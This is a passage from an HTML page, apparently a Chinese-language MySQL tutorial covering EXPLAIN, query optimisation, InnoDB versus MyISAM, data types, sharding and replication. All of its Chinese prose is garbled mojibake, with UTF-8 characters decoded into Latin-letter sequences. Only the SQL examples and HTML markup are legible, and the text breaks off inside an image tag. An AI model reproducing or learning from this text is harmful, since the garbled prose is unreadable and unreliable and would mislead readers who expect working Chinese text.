ç”¨æ¥åˆ†æ SELECT æŸ¥è¯¢è¯­å¥ï¼Œå¼€å‘äººå‘˜å¯ä»¥é€šè¿‡åˆ†æ Explain ç»“æœæ¥ä¼˜åŒ–æŸ¥è¯¢è¯­å¥ã€‚</p><p>æ¯”è¾ƒé‡è¦çš„å­—æ®µæœ‰ï¼š</p><ul><li>select_type : æŸ¥è¯¢ç±»å‹ï¼Œæœ‰ç®€å•æŸ¥è¯¢ã€è”åˆæŸ¥è¯¢ã€å­æŸ¥è¯¢ç­‰</li><li>key : ä½¿ç”¨çš„ç´¢å¼•</li><li>rows : æ‰«æçš„è¡Œæ•°</li></ul><h2>ä¼˜åŒ–æ•°æ®è®¿é—®</h2><h3>1. å‡å°‘è¯·æ±‚çš„æ•°æ®é‡</h3><ul><li>åªè¿”å›å¿…è¦çš„åˆ—ï¼šæœ€å¥½ä¸è¦ä½¿ç”¨ SELECT * è¯­å¥ã€‚</li><li>åªè¿”å›å¿…è¦çš„è¡Œï¼šä½¿ç”¨ LIMIT è¯­å¥æ¥é™åˆ¶è¿”å›çš„æ•°æ®ã€‚</li><li>ç¼“å­˜é‡å¤æŸ¥è¯¢çš„æ•°æ®ï¼šä½¿ç”¨ç¼“å­˜å¯ä»¥é¿å…åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç‰¹åˆ«åœ¨è¦æŸ¥è¯¢çš„æ•°æ®ç»å¸¸è¢«é‡å¤æŸ¥è¯¢æ—¶ï¼Œç¼“å­˜å¸¦æ¥çš„æŸ¥è¯¢æ€§èƒ½æå‡å°†ä¼šæ˜¯éå¸¸æ˜æ˜¾çš„ã€‚</li></ul><h3>2. å‡å°‘æœåŠ¡å™¨ç«¯æ‰«æçš„è¡Œæ•°</h3><p>æœ€æœ‰æ•ˆçš„æ–¹å¼æ˜¯ä½¿ç”¨ç´¢å¼•æ¥è¦†ç›–æŸ¥è¯¢ã€‚</p><h2>é‡æ„æŸ¥è¯¢æ–¹å¼</h2><h3>1. åˆ‡åˆ†å¤§æŸ¥è¯¢</h3><p>ä¸€ä¸ªå¤§æŸ¥è¯¢å¦‚æœä¸€æ¬¡æ€§æ‰§è¡Œçš„è¯ï¼Œå¯èƒ½ä¸€æ¬¡é”ä½å¾ˆå¤šæ•°æ®ã€å æ»¡æ•´ä¸ªäº‹åŠ¡æ—¥å¿—ã€è€—å°½ç³»ç»Ÿèµ„æºã€é˜»å¡å¾ˆå¤šå°çš„ä½†é‡è¦çš„æŸ¥è¯¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">DELETE</span> <span class=\"k\">FROM</span> <span class=\"n\">messages</span> <span class=\"k\">WHERE</span> <span class=\"k\">create</span> <span class=\"o\">&lt;</span> <span class=\"n\">DATE_SUB</span><span class=\"p\">(</span><span class=\"n\">NOW</span><span class=\"p\">(),</span> <span class=\"nb\">INTERVAL</span> <span class=\"mi\">3</span> <span class=\"k\">MONTH</span><span class=\"p\">);</span>\n<span class=\"n\">rows_affected</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n<span class=\"k\">do</span> <span class=\"err\">{</span>\n    <span class=\"n\">rows_affected</span> <span class=\"o\">=</span> <span class=\"n\">do_query</span><span class=\"p\">(</span>\n    <span class=\"s2\">&#34;DELETE FROM messages WHERE create  &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000&#34;</span><span class=\"p\">)</span>\n<span class=\"err\">}</span> <span class=\"n\">while</span> <span class=\"n\">rows_affected</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span></code></pre></div><h3>2. åˆ†è§£å¤§è¿æ¥æŸ¥è¯¢</h3><p>å°†ä¸€ä¸ªå¤§è¿æ¥æŸ¥è¯¢åˆ†è§£æˆå¯¹æ¯ä¸€ä¸ªè¡¨è¿›è¡Œä¸€æ¬¡å•è¡¨æŸ¥è¯¢ï¼Œç„¶ååœ¨åº”ç”¨ç¨‹åºä¸­è¿›è¡Œå…³è”ï¼Œè¿™æ ·åšçš„å¥½å¤„æœ‰ï¼š</p><ul><li>è®©ç¼“å­˜æ›´é«˜æ•ˆã€‚å¯¹äºè¿æ¥æŸ¥è¯¢ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæ•´ä¸ªæŸ¥è¯¢ç¼“å­˜å°±æ— æ³•ä½¿ç”¨ã€‚è€Œåˆ†è§£åçš„å¤šä¸ªæŸ¥è¯¢ï¼Œå³ä½¿å…¶ä¸­ä¸€ä¸ªè¡¨å‘ç”Ÿå˜åŒ–ï¼Œå¯¹å…¶å®ƒè¡¨çš„æŸ¥è¯¢ç¼“å­˜ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚</li><li>åˆ†è§£æˆå¤šä¸ªå•è¡¨æŸ¥è¯¢ï¼Œè¿™äº›å•è¡¨æŸ¥è¯¢çš„ç¼“å­˜ç»“æœæ›´å¯èƒ½è¢«å…¶å®ƒæŸ¥è¯¢ä½¿ç”¨åˆ°ï¼Œä»è€Œå‡å°‘å†—ä½™è®°å½•çš„æŸ¥è¯¢ã€‚</li><li>å‡å°‘é”ç«äº‰ï¼›</li><li>åœ¨åº”ç”¨å±‚è¿›è¡Œè¿æ¥ï¼Œå¯ä»¥æ›´å®¹æ˜“å¯¹æ•°æ®åº“è¿›è¡Œæ‹†åˆ†ï¼Œä»è€Œæ›´å®¹æ˜“åšåˆ°é«˜æ€§èƒ½å’Œå¯ä¼¸ç¼©ã€‚</li><li>æŸ¥è¯¢æœ¬èº«æ•ˆç‡ä¹Ÿå¯èƒ½ä¼šæœ‰æ‰€æå‡ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œä½¿ç”¨ IN() ä»£æ›¿è¿æ¥æŸ¥è¯¢ï¼Œå¯ä»¥è®© MySQL æŒ‰ç…§ ID é¡ºåºè¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™å¯èƒ½æ¯”éšæœºçš„è¿æ¥è¦æ›´é«˜æ•ˆã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">tab</span>\n<span class=\"k\">JOIN</span> <span class=\"n\">tag_post</span> <span class=\"k\">ON</span> <span class=\"n\">tag_post</span><span class=\"p\">.</span><span class=\"n\">tag_id</span><span class=\"o\">=</span><span class=\"n\">tag</span><span class=\"p\">.</span><span class=\"n\">id</span>\n<span class=\"k\">JOIN</span> <span class=\"n\">post</span> <span class=\"k\">ON</span> <span class=\"n\">tag_post</span><span class=\"p\">.</span><span class=\"n\">post_id</span><span class=\"o\">=</span><span class=\"n\">post</span><span class=\"p\">.</span><span class=\"n\">id</span>\n<span class=\"k\">WHERE</span> <span class=\"n\">tag</span><span class=\"p\">.</span><span class=\"n\">tag</span><span class=\"o\">=</span><span class=\"s1\">&#39;mysql&#39;</span><span class=\"p\">;</span>\n<span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">tag</span> <span class=\"k\">WHERE</span> <span class=\"n\">tag</span><span class=\"o\">=</span><span class=\"s1\">&#39;mysql&#39;</span><span class=\"p\">;</span>\n<span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">tag_post</span> <span class=\"k\">WHERE</span> <span class=\"n\">tag_id</span><span class=\"o\">=</span><span class=\"mi\">1234</span><span class=\"p\">;</span>\n<span class=\"k\">SELECT</span> <span class=\"o\">*</span> <span class=\"k\">FROM</span> <span class=\"n\">post</span> <span class=\"k\">WHERE</span> <span class=\"n\">post</span><span class=\"p\">.</span><span class=\"n\">id</span> <span class=\"k\">IN</span> <span class=\"p\">(</span><span class=\"mi\">123</span><span class=\"p\">,</span><span class=\"mi\">456</span><span class=\"p\">,</span><span class=\"mi\">567</span><span class=\"p\">,</span><span class=\"mi\">9098</span><span class=\"p\">,</span><span class=\"mi\">8904</span><span class=\"p\">);</span></code></pre></div><h2>ä¸‰ã€å­˜å‚¨å¼•æ“</h2><h2>InnoDB</h2><p>æ˜¯ MySQL é»˜è®¤çš„äº‹åŠ¡å‹å­˜å‚¨å¼•æ“ï¼Œåªæœ‰åœ¨éœ€è¦å®ƒä¸æ”¯æŒçš„ç‰¹æ€§æ—¶ï¼Œæ‰è€ƒè™‘ä½¿ç”¨å…¶å®ƒå­˜å‚¨å¼•æ“ã€‚</p><p>å®ç°äº†å››ä¸ªæ ‡å‡†çš„éš”ç¦»çº§åˆ«ï¼Œé»˜è®¤çº§åˆ«æ˜¯å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰ã€‚åœ¨å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹ï¼Œé€šè¿‡å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰+ é—´éš™é”ï¼ˆNext-Key Lockingï¼‰é˜²æ­¢å¹»å½±è¯»ã€‚</p><p>ä¸»ç´¢å¼•æ˜¯èšç°‡ç´¢å¼•ï¼Œåœ¨ç´¢å¼•ä¸­ä¿å­˜äº†æ•°æ®ï¼Œä»è€Œé¿å…ç›´æ¥è¯»å–ç£ç›˜ï¼Œå› æ­¤å¯¹æŸ¥è¯¢æ€§èƒ½æœ‰å¾ˆå¤§çš„æå‡ã€‚</p><p>å†…éƒ¨åšäº†å¾ˆå¤šä¼˜åŒ–ï¼ŒåŒ…æ‹¬ä»ç£ç›˜è¯»å–æ•°æ®æ—¶é‡‡ç”¨çš„å¯é¢„æµ‹æ€§è¯»ã€èƒ½å¤ŸåŠ å¿«è¯»æ“ä½œå¹¶ä¸”è‡ªåŠ¨åˆ›å»ºçš„è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•ã€èƒ½å¤ŸåŠ é€Ÿæ’å…¥æ“ä½œçš„æ’å…¥ç¼“å†²åŒºç­‰ã€‚</p><p>æ”¯æŒçœŸæ­£çš„åœ¨çº¿çƒ­å¤‡ä»½ã€‚å…¶å®ƒå­˜å‚¨å¼•æ“ä¸æ”¯æŒåœ¨çº¿çƒ­å¤‡ä»½ï¼Œè¦è·å–ä¸€è‡´æ€§è§†å›¾éœ€è¦åœæ­¢å¯¹æ‰€æœ‰è¡¨çš„å†™å…¥ï¼Œè€Œåœ¨è¯»å†™æ··åˆåœºæ™¯ä¸­ï¼Œåœæ­¢å†™å…¥å¯èƒ½ä¹Ÿæ„å‘³ç€åœæ­¢è¯»å–ã€‚</p><h2>MyISAM</h2><p>è®¾è®¡ç®€å•ï¼Œæ•°æ®ä»¥ç´§å¯†æ ¼å¼å­˜å‚¨ã€‚å¯¹äºåªè¯»æ•°æ®ï¼Œæˆ–è€…è¡¨æ¯”è¾ƒå°ã€å¯ä»¥å®¹å¿ä¿®å¤æ“ä½œï¼Œåˆ™ä¾ç„¶å¯ä»¥ä½¿ç”¨å®ƒã€‚</p><p>æä¾›äº†å¤§é‡çš„ç‰¹æ€§ï¼ŒåŒ…æ‹¬å‹ç¼©è¡¨ã€ç©ºé—´æ•°æ®ç´¢å¼•ç­‰ã€‚</p><p>ä¸æ”¯æŒäº‹åŠ¡ã€‚</p><p>ä¸æ”¯æŒè¡Œçº§é”ï¼Œåªèƒ½å¯¹æ•´å¼ è¡¨åŠ é”ï¼Œè¯»å–æ—¶ä¼šå¯¹éœ€è¦è¯»åˆ°çš„æ‰€æœ‰è¡¨åŠ å…±äº«é”ï¼Œå†™å…¥æ—¶åˆ™å¯¹è¡¨åŠ æ’å®ƒé”ã€‚ä½†åœ¨è¡¨æœ‰è¯»å–æ“ä½œçš„åŒæ—¶ï¼Œä¹Ÿå¯ä»¥å¾€è¡¨ä¸­æ’å…¥æ–°çš„è®°å½•ï¼Œè¿™è¢«ç§°ä¸ºå¹¶å‘æ’å…¥ï¼ˆCONCURRENT INSERTï¼‰ã€‚</p><p>å¯ä»¥æ‰‹å·¥æˆ–è€…è‡ªåŠ¨æ‰§è¡Œæ£€æŸ¥å’Œä¿®å¤æ“ä½œï¼Œä½†æ˜¯å’Œäº‹åŠ¡æ¢å¤ä»¥åŠå´©æºƒæ¢å¤ä¸åŒï¼Œå¯èƒ½å¯¼è‡´ä¸€äº›æ•°æ®ä¸¢å¤±ï¼Œè€Œä¸”ä¿®å¤æ“ä½œæ˜¯éå¸¸æ…¢çš„ã€‚</p><p>å¦‚æœæŒ‡å®šäº† DELAY_KEY_WRITE é€‰é¡¹ï¼Œåœ¨æ¯æ¬¡ä¿®æ”¹æ‰§è¡Œå®Œæˆæ—¶ï¼Œä¸ä¼šç«‹å³å°†ä¿®æ”¹çš„ç´¢å¼•æ•°æ®å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯ä¼šå†™åˆ°å†…å­˜ä¸­çš„é”®ç¼“å†²åŒºï¼Œåªæœ‰åœ¨æ¸…ç†é”®ç¼“å†²åŒºæˆ–è€…å…³é—­è¡¨çš„æ—¶å€™æ‰ä¼šå°†å¯¹åº”çš„ç´¢å¼•å—å†™å…¥ç£ç›˜ã€‚è¿™ç§æ–¹å¼å¯ä»¥æå¤§çš„æå‡å†™å…¥æ€§èƒ½ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“æˆ–è€…ä¸»æœºå´©æºƒæ—¶ä¼šé€ æˆç´¢å¼•æŸåï¼Œéœ€è¦æ‰§è¡Œä¿®å¤æ“ä½œã€‚</p><h2>æ¯”è¾ƒ</h2><ul><li> äº‹åŠ¡ï¼šInnoDB æ˜¯äº‹åŠ¡å‹çš„ï¼Œå¯ä»¥ä½¿ç”¨ Commit å’Œ Rollback è¯­å¥ã€‚<br/> </li><li> å¹¶å‘ï¼šMyISAM åªæ”¯æŒè¡¨çº§é”ï¼Œè€Œ InnoDB è¿˜æ”¯æŒè¡Œçº§é”ã€‚<br/> </li><li> å¤–é”®ï¼šInnoDB æ”¯æŒå¤–é”®ã€‚<br/> </li><li> å¤‡ä»½ï¼šInnoDB æ”¯æŒåœ¨çº¿çƒ­å¤‡ä»½ã€‚<br/> </li><li> å´©æºƒæ¢å¤ï¼šMyISAM å´©æºƒåå‘ç”ŸæŸåçš„æ¦‚ç‡æ¯” InnoDB é«˜å¾ˆå¤šï¼Œè€Œä¸”æ¢å¤çš„é€Ÿåº¦ä¹Ÿæ›´æ…¢ã€‚<br/> </li><li> å…¶å®ƒç‰¹æ€§ï¼šMyISAM æ”¯æŒå‹ç¼©è¡¨å’Œç©ºé—´æ•°æ®ç´¢å¼•ã€‚<br/> </li></ul><h2>å››ã€æ•°æ®ç±»å‹</h2><h2>æ•´å‹</h2><p>TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT åˆ†åˆ«ä½¿ç”¨ 8, 16, 24, 32, 64 ä½å­˜å‚¨ç©ºé—´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¶Šå°çš„åˆ—è¶Šå¥½ã€‚</p><p>INT(11) ä¸­çš„æ•°å­—åªæ˜¯è§„å®šäº†äº¤äº’å·¥å…·æ˜¾ç¤ºå­—ç¬¦çš„ä¸ªæ•°ï¼Œå¯¹äºå­˜å‚¨å’Œè®¡ç®—æ¥è¯´æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚</p><h2>æµ®ç‚¹æ•°</h2><p>FLOAT å’Œ DOUBLE ä¸ºæµ®ç‚¹ç±»å‹ï¼ŒDECIMAL ä¸ºé«˜ç²¾åº¦å°æ•°ç±»å‹ã€‚CPU åŸç”Ÿæ”¯æŒæµ®ç‚¹è¿ç®—ï¼Œä½†æ˜¯ä¸æ”¯æŒ DECIMAl ç±»å‹çš„è®¡ç®—ï¼Œå› æ­¤ DECIMAL çš„è®¡ç®—æ¯”æµ®ç‚¹ç±»å‹éœ€è¦æ›´é«˜çš„ä»£ä»·ã€‚</p><p>FLOATã€DOUBLE å’Œ DECIMAL éƒ½å¯ä»¥æŒ‡å®šåˆ—å®½ï¼Œä¾‹å¦‚ DECIMAL(18, 9) è¡¨ç¤ºæ€»å…± 18 ä½ï¼Œå– 9 ä½å­˜å‚¨å°æ•°éƒ¨åˆ†ï¼Œå‰©ä¸‹ 9 ä½å­˜å‚¨æ•´æ•°éƒ¨åˆ†ã€‚</p><h2>å­—ç¬¦ä¸²</h2><p>ä¸»è¦æœ‰ CHAR å’Œ VARCHAR ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯å®šé•¿çš„ï¼Œä¸€ç§æ˜¯å˜é•¿çš„ã€‚</p><p>VARCHAR è¿™ç§å˜é•¿ç±»å‹èƒ½å¤ŸèŠ‚çœç©ºé—´ï¼Œå› ä¸ºåªéœ€è¦å­˜å‚¨å¿…è¦çš„å†…å®¹ã€‚ä½†æ˜¯åœ¨æ‰§è¡Œ UPDATE æ—¶å¯èƒ½ä¼šä½¿è¡Œå˜å¾—æ¯”åŸæ¥é•¿ï¼Œå½“è¶…å‡ºä¸€ä¸ªé¡µæ‰€èƒ½å®¹çº³çš„å¤§å°æ—¶ï¼Œå°±è¦æ‰§è¡Œé¢å¤–çš„æ“ä½œã€‚MyISAM ä¼šå°†è¡Œæ‹†æˆä¸åŒçš„ç‰‡æ®µå­˜å‚¨ï¼Œè€Œ InnoDB åˆ™éœ€è¦åˆ†è£‚é¡µæ¥ä½¿è¡Œæ”¾è¿›é¡µå†…ã€‚</p><p>åœ¨è¿›è¡Œå­˜å‚¨å’Œæ£€ç´¢æ—¶ï¼Œä¼šä¿ç•™ VARCHAR æœ«å°¾çš„ç©ºæ ¼ï¼Œè€Œä¼šåˆ é™¤ CHAR æœ«å°¾çš„ç©ºæ ¼ã€‚</p><h2>æ—¶é—´å’Œæ—¥æœŸ</h2><p>MySQL æä¾›äº†ä¸¤ç§ç›¸ä¼¼çš„æ—¥æœŸæ—¶é—´ç±»å‹ï¼šDATETIME å’Œ TIMESTAMPã€‚</p><h3>1. DATETIME</h3><p>èƒ½å¤Ÿä¿å­˜ä» 1000 å¹´åˆ° 9999 å¹´çš„æ—¥æœŸå’Œæ—¶é—´ï¼Œç²¾åº¦ä¸ºç§’ï¼Œä½¿ç”¨ 8 å­—èŠ‚çš„å­˜å‚¨ç©ºé—´ã€‚</p><p>å®ƒä¸æ—¶åŒºæ— å…³ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQL ä»¥ä¸€ç§å¯æ’åºçš„ã€æ— æ­§ä¹‰çš„æ ¼å¼æ˜¾ç¤º DATETIME å€¼ï¼Œä¾‹å¦‚â€œ2008-01-16 22:37:08â€ï¼Œè¿™æ˜¯ ANSI æ ‡å‡†å®šä¹‰çš„æ—¥æœŸå’Œæ—¶é—´è¡¨ç¤ºæ–¹æ³•ã€‚</p><h3>2. TIMESTAMP</h3><p>å’Œ UNIX æ—¶é—´æˆ³ç›¸åŒï¼Œä¿å­˜ä» 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œï¼ˆæ ¼æ—å¨æ²»æ—¶é—´ï¼‰ä»¥æ¥çš„ç§’æ•°ï¼Œä½¿ç”¨ 4 ä¸ªå­—èŠ‚ï¼Œåªèƒ½è¡¨ç¤ºä» 1970 å¹´åˆ° 2038 å¹´ã€‚</p><p>å®ƒå’Œæ—¶åŒºæœ‰å…³ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæ—¶é—´æˆ³åœ¨ä¸åŒçš„æ—¶åŒºæ‰€ä»£è¡¨çš„å…·ä½“æ—¶é—´æ˜¯ä¸åŒçš„ã€‚</p><p>MySQL æä¾›äº† FROM_UNIXTIME() å‡½æ•°æŠŠ UNIX æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸï¼Œå¹¶æä¾›äº† UNIX_TIMESTAMP() å‡½æ•°æŠŠæ—¥æœŸè½¬æ¢ä¸º UNIX æ—¶é—´æˆ³ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ’å…¥æ—¶æ²¡æœ‰æŒ‡å®š TIMESTAMP åˆ—çš„å€¼ï¼Œä¼šå°†è¿™ä¸ªå€¼è®¾ç½®ä¸ºå½“å‰æ—¶é—´ã€‚</p><p>åº”è¯¥å°½é‡ä½¿ç”¨ TIMESTAMPï¼Œå› ä¸ºå®ƒæ¯” DATETIME ç©ºé—´æ•ˆç‡æ›´é«˜ã€‚</p><h2>äº”ã€åˆ‡åˆ†</h2><h2>æ°´å¹³åˆ‡åˆ†</h2><p>æ°´å¹³åˆ‡åˆ†åˆç§°ä¸º Shardingï¼Œå®ƒæ˜¯å°†åŒä¸€ä¸ªè¡¨ä¸­çš„è®°å½•æ‹†åˆ†åˆ°å¤šä¸ªç»“æ„ç›¸åŒçš„è¡¨ä¸­ã€‚</p><p>å½“ä¸€ä¸ªè¡¨çš„æ•°æ®ä¸æ–­å¢å¤šæ—¶ï¼ŒSharding æ˜¯å¿…ç„¶çš„é€‰æ‹©ï¼Œå®ƒå¯ä»¥å°†æ•°æ®åˆ†å¸ƒåˆ°é›†ç¾¤çš„ä¸åŒèŠ‚ç‚¹ä¸Šï¼Œä»è€Œç¼“å­˜å•ä¸ªæ•°æ®åº“çš„å‹åŠ›ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-53b5e5bf4d85806abd3abda2f5110591_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"562\" data-rawheight=\"215\" class=\"origin_image zh-lightbox-thumb\" width=\"562\" data-original=\"https://pic2.zhimg.com/v2-53b5e5bf4d85806abd3abda2f5110591_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;562&#39; height=&#39;215&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"562\" data-rawheight=\"215\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"562\" data-original=\"https://pic2.zhimg.com/v2-53b5e5bf4d85806abd3abda2f5110591_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-53b5e5bf4d85806abd3abda2f5110591_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‚ç›´åˆ‡åˆ†</h2><p>å‚ç›´åˆ‡åˆ†æ˜¯å°†ä¸€å¼ è¡¨æŒ‰åˆ—åˆ‡åˆ†æˆå¤šä¸ªè¡¨ï¼Œé€šå¸¸æ˜¯æŒ‰ç…§åˆ—çš„å…³ç³»å¯†é›†ç¨‹åº¦è¿›è¡Œåˆ‡åˆ†ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å‚ç›´åˆ‡åˆ†å°†ç»å¸¸è¢«ä½¿ç”¨çš„åˆ—å’Œä¸ç»å¸¸è¢«ä½¿ç”¨çš„åˆ—åˆ‡åˆ†åˆ°ä¸åŒçš„è¡¨ä¸­ã€‚</p><p>åœ¨æ•°æ®åº“çš„å±‚é¢ä½¿ç”¨å‚ç›´åˆ‡åˆ†å°†æŒ‰æ•°æ®åº“ä¸­è¡¨çš„å¯†é›†ç¨‹åº¦éƒ¨ç½²åˆ°ä¸åŒçš„åº“ä¸­ï¼Œä¾‹å¦‚å°†åŸæ¥çš„ç”µå•†æ•°æ®åº“å‚ç›´åˆ‡åˆ†æˆå•†å“æ•°æ®åº“ã€ç”¨æˆ·æ•°æ®åº“ç­‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-fb1b0a0f37e6afec2f60e555e54ccbaf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"466\" data-rawheight=\"345\" class=\"origin_image zh-lightbox-thumb\" width=\"466\" data-original=\"https://pic4.zhimg.com/v2-fb1b0a0f37e6afec2f60e555e54ccbaf_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;466&#39; height=&#39;345&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"466\" data-rawheight=\"345\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"466\" data-original=\"https://pic4.zhimg.com/v2-fb1b0a0f37e6afec2f60e555e54ccbaf_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-fb1b0a0f37e6afec2f60e555e54ccbaf_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>Sharding ç­–ç•¥</h2><ul><li>å“ˆå¸Œå–æ¨¡ï¼šhash(key) % Nï¼›</li><li>èŒƒå›´ï¼šå¯ä»¥æ˜¯ ID èŒƒå›´ä¹Ÿå¯ä»¥æ˜¯æ—¶é—´èŒƒå›´ï¼›</li><li>æ˜ å°„è¡¨ï¼šä½¿ç”¨å•ç‹¬çš„ä¸€ä¸ªæ•°æ®åº“æ¥å­˜å‚¨æ˜ å°„å…³ç³»ã€‚</li></ul><h2>Sharding å­˜åœ¨çš„é—®é¢˜</h2><h3>1. äº‹åŠ¡é—®é¢˜</h3><p>ä½¿ç”¨åˆ†å¸ƒå¼äº‹åŠ¡æ¥è§£å†³ï¼Œæ¯”å¦‚ XA æ¥å£ã€‚</p><h3>2. è¿æ¥</h3><p>å¯ä»¥å°†åŸæ¥çš„è¿æ¥åˆ†è§£æˆå¤šä¸ªå•è¡¨æŸ¥è¯¢ï¼Œç„¶ååœ¨ç”¨æˆ·ç¨‹åºä¸­è¿›è¡Œè¿æ¥ã€‚</p><h3>3. ID å”¯ä¸€æ€§</h3><ul><li>ä½¿ç”¨å…¨å±€å”¯ä¸€ IDï¼ˆGUIDï¼‰</li><li>ä¸ºæ¯ä¸ªåˆ†ç‰‡æŒ‡å®šä¸€ä¸ª ID èŒƒå›´</li><li>åˆ†å¸ƒå¼ ID ç”Ÿæˆå™¨ (å¦‚ Twitter çš„ Snowflake ç®—æ³•)</li></ul><h2>å…­ã€å¤åˆ¶</h2><h2>ä¸»ä»å¤åˆ¶</h2><p>ä¸»è¦æ¶‰åŠä¸‰ä¸ªçº¿ç¨‹ï¼šbinlog çº¿ç¨‹ã€I/O çº¿ç¨‹å’Œ SQL çº¿ç¨‹ã€‚</p><ul><li><b>binlog çº¿ç¨‹</b> ï¼šè´Ÿè´£å°†ä¸»æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ›´æ”¹å†™å…¥äºŒè¿›åˆ¶æ—¥å¿—ï¼ˆBinary logï¼‰ä¸­ã€‚</li><li><b>I/O çº¿ç¨‹</b> ï¼šè´Ÿè´£ä»ä¸»æœåŠ¡å™¨ä¸Šè¯»å–äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¹¶å†™å…¥ä»æœåŠ¡å™¨çš„ä¸­ç»§æ—¥å¿—ï¼ˆRelay logï¼‰ã€‚</li><li><b>SQL çº¿ç¨‹</b> ï¼šè´Ÿè´£è¯»å–ä¸­ç»§æ—¥å¿—ï¼Œè§£æå‡ºä¸»æœåŠ¡å™¨å·²ç»æ‰§è¡Œçš„æ•°æ®æ›´æ”¹å¹¶åœ¨ä»æœåŠ¡å™¨ä¸­é‡æ”¾ï¼ˆReplayï¼‰ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-c5e66808c1b34395e8a06b25f5ded53c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"345\" class=\"origin_image zh-lightbox-thumb\" width=\"704\" data-original=\"https://pic1.zhimg.com/v2-c5e66808c1b34395e8a06b25f5ded53c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;704&#39; height=&#39;345&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"345\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"704\" data-original=\"https://pic1.zhimg.com/v2-c5e66808c1b34395e8a06b25f5ded53c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-c5e66808c1b34395e8a06b25f5ded53c_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è¯»å†™åˆ†ç¦»</h2><p>ä¸»æœåŠ¡å™¨å¤„ç†å†™æ“ä½œä»¥åŠå®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„è¯»æ“ä½œï¼Œè€Œä»æœåŠ¡å™¨å¤„ç†è¯»æ“ä½œã€‚</p><p>è¯»å†™åˆ†ç¦»èƒ½æé«˜æ€§èƒ½çš„åŸå› åœ¨äºï¼š</p><ul><li>ä¸»ä»æœåŠ¡å™¨è´Ÿè´£å„è‡ªçš„è¯»å’Œå†™ï¼Œæå¤§ç¨‹åº¦ç¼“è§£äº†é”çš„äº‰ç”¨ï¼›</li><li>ä»æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨ MyISAMï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ä»¥åŠèŠ‚çº¦ç³»ç»Ÿå¼€é”€ï¼›</li><li>å¢åŠ å†—ä½™ï¼Œæé«˜å¯ç”¨æ€§ã€‚</li></ul><p>è¯»å†™åˆ†ç¦»å¸¸ç”¨ä»£ç†æ–¹å¼æ¥å®ç°ï¼Œä»£ç†æœåŠ¡å™¨æ¥æ”¶åº”ç”¨å±‚ä¼ æ¥çš„è¯»å†™è¯·æ±‚ï¼Œç„¶åå†³å®šè½¬å‘åˆ°å“ªä¸ªæœåŠ¡å™¨ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-077ac71910b1c1e212ab8b92df465c6e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"632\" 